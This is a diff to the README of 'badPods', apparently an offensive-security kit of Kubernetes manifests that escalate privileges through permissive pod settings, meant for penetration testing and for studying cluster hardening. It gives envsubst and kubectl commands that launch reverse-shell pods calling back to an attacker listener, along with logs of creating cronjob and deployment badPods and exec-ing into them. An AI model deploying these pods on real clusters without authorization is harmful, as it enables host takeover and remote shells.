@@ -14,9 +14,9 @@ What if you can create a pod with just `hostNetwork`, just `hostPID`, just `host
 In order to be successful in this attack path, you'll need the following: 
 
 1. Access to a cluster 
-1. Permission to create one of the following resource types in at least one namespace: 
+1. RBAC Permission to create one of the following resource types in at least one namespace: 
    * CronJob, DeamonSet, Deployment, Job, Pod, ReplicaSet, ReplicationController, StatefulSet
-1. Access to exec into pods or a network policy that allows a reverse shell from a pod to reach you. 
+1. RBAC permission to exec into pods or a network policy that allows a reverse shell from a pod to reach you. 
 1. A pod security policy (or other pod admission controller's logic) that llows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all
 
 ## The badPods line-up
@@ -36,6 +36,8 @@ Nothing allowed | [readme](manifests/nothing-allowed/) | [manifest](manifests/no
 Check out blog post here
 
 # Organization
+There are 128 manifests. 
+* `8 types of badPods` X `8 types of resources` X `2 access methods - exec/reverse shell`
 ```bash
 ├── manifests
 │   ├── everything-allowed
@@ -75,13 +77,13 @@ Check out blog post here
 
 ## "There are Eight ways to create a Pod"
 As [Eviatar Gerzi (@g3rzi)](https://twitter.com/g3rzi) points out in the post [Eight Ways to Create a Pod
-](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod), there might be a situation where you are not authorized to create pods, but you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 
+](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod), there are 8 different controllers that create a pod, or a set of pods.  You might be a situation where you are not authorized to create pods, but you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 
 
 ## Reverse shells
 While common, it is not always the case that you can exec into pods that you can create. To help in those situations, a version of each manifest is included that will call back to your listener as soon as the pod is created. 
 
 # Usage
-Each resource in the `manifests` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Within each badPod type, there are manifests that will create the 8 different resource types that in turn create pods. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  
+Each resource in the `manifests` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  
 
 ### Clone the repo
 ```bash
@@ -101,8 +103,8 @@ kubectl apply -f ./manifests/hostipc/pod/hostipc-exec-pod.yaml
 kubectl apply -f ./manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
 ```
 
-### Reverse shell version of each pod
-If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!
+### Create all eight revsere shell badPods
+To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!
 
 ```bash
 HOST="10.0.0.1" PORT="3111" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
@@ -114,6 +116,40 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/pod/hostnetwork-r
 HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshellv-pod.yaml | kubectl apply -f -
 HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
 ```
+### Create a cronjob of the hostNetwork Pod
+```bash
+seth@dev:/projects/badPods$ kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
+cronjob.batch/hostnetwork-exec-cronjob created
+```
+Find the created pod
+```bash
+seth@dev:/projects/badPods$ kubectl get pods | grep cronjob
+NAME                                        READY   STATUS    RESTARTS   AGE
+hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
+```
+Exec into pod
+```bash
+seth@dev:/mnt/hgfs/projects/badPods$ kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
+```
+
+### Create a deployment 
+```bash
+seth@dev:/projects/badPods$ kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
+deployment.apps/priv-and-hostpid-exec-deployment created
+```
+Find the created pod
+```bash
+seth@dev:/projects/badPods$ kubectl get pods | grep deployment
+priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9   1/1     Running   0          56s
+priv-and-hostpid-exec-deployment-65dbfbf947-tghqh   1/1     Running   0          56s
+```
+Exec into pod
+```bash
+seth@dev:/projects/badPods$ kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
+```
+
+# Contributing
+Have you run into a situation where there was a restritive policy, but you were still able to gain elevated access with only a subset of privileges or capabilites? If so, please consider sharing the yaml and the privesc steps, and we'll add it as a new badPod type. 
 
 # Acknowledgements 
 Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), [Mark Manning](https://twitter.com/antitree), and [Eviatar Gerzi](https://twitter.com/g3rzi) for publicly sharing so much knowledge about Kubernetes offensive security. 
